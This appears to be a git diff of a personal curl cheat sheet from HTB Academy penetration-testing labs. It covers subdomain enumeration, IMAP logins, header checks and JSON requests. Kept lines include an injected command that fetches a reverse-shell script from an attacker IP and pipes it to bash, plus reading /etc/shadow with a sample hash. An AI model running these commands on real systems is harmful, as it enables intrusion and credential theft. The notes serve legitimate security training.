@@ -3,7 +3,7 @@
 Tags: #⚙️
 Related to:
 See also: [[wget]]
-Previous: [[Web Requests]], [[JavaScript Deobfuscation]], [[Hacking Wordpress]], [[Getting Started]], [[Footprinting]]
+Previous: [[Web Requests]], [[JavaScript Deobfuscation]], [[Hacking Wordpress]], [[Getting Started]], [[Footprinting]], [[Information Gathering - Web Edition]]
 
 ## Description
 
@@ -31,6 +31,18 @@ Transfer a URL. Short for 'client url'.
 | `curl -b 'PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1' http://<SERVER_IP>:<PORT>/` | Set request cookies |
 | `curl -X POST -d '{"search":"london"}' -H 'Content-Type: application/json' http://<SERVER_IP>:<PORT>/search.php` | Send POST request with JSON data |
 
+#### Passive Subdomain Enumeration
+
+| **Resource/Command** | **Description** |
+|-|-|
+| `curl -s https://sonar.omnisint.io/subdomains/{domain} \| jq -r '.[]' \| sort -u` | All subdomains for a given domain. |
+| `curl -s https://sonar.omnisint.io/tlds/{domain} \| jq -r '.[]' \| sort -u` | All TLDs found for a given domain. |
+| `curl -s https://sonar.omnisint.io/all/{domain} \| jq -r '.[]' \| sort -u` | All results across all TLDs for a given domain. |
+| `curl -s https://sonar.omnisint.io/reverse/{ip} \| jq -r '.[]' \| sort -u` | Reverse DNS lookup on IP address. |
+| `curl -s https://sonar.omnisint.io/reverse/{ip}/{mask} \| jq -r '.[]' \| sort -u` | Reverse DNS lookup of a CIDR range. |
+| `curl -s "https://crt.sh/?q=${TARGET}&output=json" \| jq -r '.[] \| "\(.name_value)\n\(.common_name)"' \| sort -u` | Certificate Transparency. |
+
+
 #### APIs
 
 | **Command** | **Description** |
@@ -47,9 +59,47 @@ Transfer a URL. Short for 'client url'.
 
 	curl -s https://crt.sh/\?q\=<target-domain>\&output\=json | jq .
 
-### Get help by man page category
+```text
+[
+  {
+    "issuer_ca_id": 183267,
+    "issuer_name": "C=US, O=Let's Encrypt, CN=R3",
+    "common_name": "inlanefreight.com",
+    "name_value": "inlanefreight.com\nwww.inlanefreight.com",
+    "id": 8022808792,
+    "entry_timestamp": "2022-11-20T17:21:52.454",
+    "not_before": "2022-11-20T16:21:51",
+    "not_after": "2023-02-18T16:21:50",
+    "serial_number": "0429e004d5023c66007d661e3755cd36a640"
+  },
+  {
+    "issuer_ca_id": 183267,
+    "issuer_name": "C=US, O=Let's Encrypt, CN=R3",
+    "common_name": "inlanefreight.com",
+    "name_value": "inlanefreight.com\nwww.inlanefreight.com",
+    "id": 8020606706,
+    "entry_timestamp": "2022-11-20T17:21:51.62",
+    "not_before": "2022-11-20T16:21:51",
+    "not_after": "2023-02-18T16:21:50",
+    "serial_number": "0429e004d5023c66007d661e3755cd36a640"
+  },
+<...snip...>
+```
 
-```shell-session
+	curl -s "https://crt.sh/?q=${TARGET}&output=json" | jq -r '.[] | "\(.name_value)\n\(.common_name)"' | sort -u > "${TARGET}_crt.sh.txt"
+
+```text
+account-control.facebook.com----retrieve-info.albayrakyangin.com
+*.adtools.facebook.com
+adtools.facebook.com
+*.ak.facebook.com
+ak.facebook.com
+<...snip...>
+```
+
+### Get Help By man Page Category
+
+```text
  auth        Different types of authentication methods
  connection  Low level networking operations
  curl        The command line tool itself
@@ -76,7 +126,7 @@ Transfer a URL. Short for 'client url'.
 
 	curl --help ssh
 
-```shell-session
+```text
 Usage: curl [options...] <url>
 ssh: SSH protocol options
      --compressed-ssh Enable SSH compression
@@ -84,23 +134,99 @@ ssh: SSH protocol options
      --pass <phrase>  Pass phrase for the private key
 ```
 
-### Grab website banner
+### Interact With IMAP
 
-	curl -IL https://www.inlanefreight.com	
+	curl -k 'imaps://10.129.14.128' --user user:p4ssw0rd
 
-### Get reverse shell
+```text
+* LIST (\HasNoChildren) "." Important
+* LIST (\HasNoChildren) "." INBOX
+```
+
+	curl -k 'imaps://10.129.14.128' --user cry0l1t3:1234 -v
+
+```text
+*   Trying 10.129.14.128:993...
+* TCP_NODELAY set
+* Connected to 10.129.14.128 (10.129.14.128) port 993 (#0)
+* successfully set certificate verify locations:
+*   CAfile: /etc/ssl/certs/ca-certificates.crt
+  CApath: /etc/ssl/certs
+* TLSv1.3 (OUT), TLS handshake, Client hello (1):
+* TLSv1.3 (IN), TLS handshake, Server hello (2):
+* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
+* TLSv1.3 (IN), TLS handshake, Certificate (11):
+* TLSv1.3 (IN), TLS handshake, CERT verify (15):
+* TLSv1.3 (IN), TLS handshake, Finished (20):
+* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):
+* TLSv1.3 (OUT), TLS handshake, Finished (20):
+* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384
+* Server certificate:
+*  subject: C=US; ST=California; L=Sacramento; O=Inlanefreight; OU=Customer Support; CN=mail1.inlanefreight.htb; emailAddress=cry0l1t3@inlanefreight.htb
+*  start date: Sep 19 19:44:58 2021 GMT
+*  expire date: Jul  4 19:44:58 2295 GMT
+*  issuer: C=US; ST=California; L=Sacramento; O=Inlanefreight; OU=Customer Support; CN=mail1.inlanefreight.htb; emailAddress=cry0l1t3@inlanefreight.htb
+*  SSL certificate verify result: self signed certificate (18), continuing anyway.
+* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
+* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
+* old SSL session ID is stale, removing
+< * OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN] HTB-Academy IMAP4 v.0.21.4
+> A001 CAPABILITY
+< * CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN
+< A001 OK Pre-login capabilities listed, post-login capabilities have more.
+> A002 AUTHENTICATE PLAIN AGNyeTBsMXQzADEyMzQ=
+< * CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY PREVIEW=FUZZY LITERAL+ NOTIFY SPECIAL-USE
+< A002 OK Logged in
+> A003 LIST "" *
+< * LIST (\HasNoChildren) "." Important
+* LIST (\HasNoChildren) "." Important
+< * LIST (\HasNoChildren) "." INBOX
+* LIST (\HasNoChildren) "." INBOX
+< A003 OK List completed (0.001 + 0.000 secs).
+* Connection #0 to host 10.129.14.128 left intact
+```
+
+### HTTP Header
+
+	curl -I "http://${TARGET}"
+
+```text
+HTTP/1.1 200 OK
+Date: Thu, 23 Sep 2021 15:10:42 GMT
+Server: Apache/2.4.25 (Debian)
+X-Powered-By: PHP/7.3.5
+Link: <http://192.168.10.10/wp-json/>; rel="https://api.w.org/"
+Content-Type: text/html; charset=UTF-8
+```
+
+	curl -I http://${TARGET}
+
+```text
+HTTP/1.1 200 OK
+Host: randomtarget.com
+Date: Thu, 23 Sep 2021 15:12:21 GMT
+Connection: close
+X-Powered-By: PHP/7.4.21
+Set-Cookie: PHPSESSID=gt02b1pqla35cvmmb2bcli96ml; path=/ 
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-type: text/html; charset=UTF-8
+```
+
+### Get Reverse Shell
 
 	http://10.129.171.59/templates/protostar/htb.php?pwn=curl 10.10.17.201/reverse_shell.sh | bash
 
-### Get local file
+### Get Local File
 
 	curl file:///etc/shadow
 
-```shell-session
+```text
 floris:$6$yl7KKyGaOhVExlCb$ONJceChbI7srpLlJ/AhCLgESU7E4gXexPVgsJMjvQ0hP.6fwslfwWmD15cuaYs9./Jin4e/4LURPgEBav4iv//:17673:0:99999:7:::
 ```
 
-### Send exploit through proxy using -x flag to see what it's doing:
+### Send Exploit Through Proxy Using -x Flag to See What It's Doing:
 
 Modify source code to run through proxy:
 
@@ -120,33 +246,33 @@ Here's how the script works:
 	echo \"BEGIN\";${cmd};echo \"END\"	// echo BEGIN and END between the command we run
 	sed -n -e '/BEGIN/,/END/ p'			// it send that to sed and grabs everything between BEGIN and END
 
-### Follow redirects
+### Follow Redirects
 
 	curl L https://www.inlanefreight.com
 
-### Authenticate with cookie and send POST request to retrieve json data
+### Authenticate With Cookie and Send POST Request to Retrieve json Data
 
 	curl -X POST -d '{"search":"flag"}' -H 'Cookie: PHPSESSID=6eaubqoi86fevu4knlpi2cg7e3' -H 'Content-Type: application/json' 'http://<IP>:<port>/search.php'
 
-```shell-session
-["flag: HTB{  }"]
+```text
+["flag: HTB{...}"]
 ```
 
-### Format json responses
+### Format json Responses
 
-#### Get raw json
+#### Get Raw json
 
 	curl http://<SERVER_IP>:<PORT>/api.php/city/london
 
-```shell-session
+```text
 [{"city_name":"London","country_name":"(UK)"}]
 ```
 
-#### Get formatted json
+#### Get Formatted json
 
 	curl -s http://<SERVER_IP>:<PORT>/api.php/city/london | jq
 
-```shell-session
+```text
 [
   {
     "city_name": "London",
@@ -155,13 +281,13 @@ Here's how the script works:
 ]
 ```
 
-### Get header silently
+### Get Header Silently
 
 301 Moved Permanently:
 
 	curl -s -I -X GET http://blog.inlanefreight.com/?author=1
 
-```shell-session
+```text
 HTTP/1.1 301 Moved Permanently
 Date: Wed, 13 May 2020 20:47:08 GMT
 Server: Apache/2.4.29 (Ubuntu)
@@ -175,7 +301,7 @@ Content-Type: text/html; charset=UTF-8
 
 	curl -s -I -X GET http://blog.inlanefreight.com/?author=100
 
-```shell-session
+```text
 HTTP/1.1 404 Not Found
 Date: Wed, 13 May 2020 20:47:14 GMT
 Server: Apache/2.4.29 (Ubuntu)
@@ -186,8 +312,20 @@ Transfer-Encoding: chunked
 Content-Type: text/html; charset=UTF-8
 ```
 
-### Log in to IMAPS service
+### Log In to IMAPS Service
 
 	curl -k 'imaps://<FQDN/IP>' --user <user>:<password>
+
+### Use Custom Header
+
+	curl -s 10.129.156.165 -H "Host: customers.inlanefreight.htb"
+
+```text
+<!doctype html>
+<head>FLAG No.4:</head>
+<body>
+        HTB{...}
+</body>
+```
 
 # References
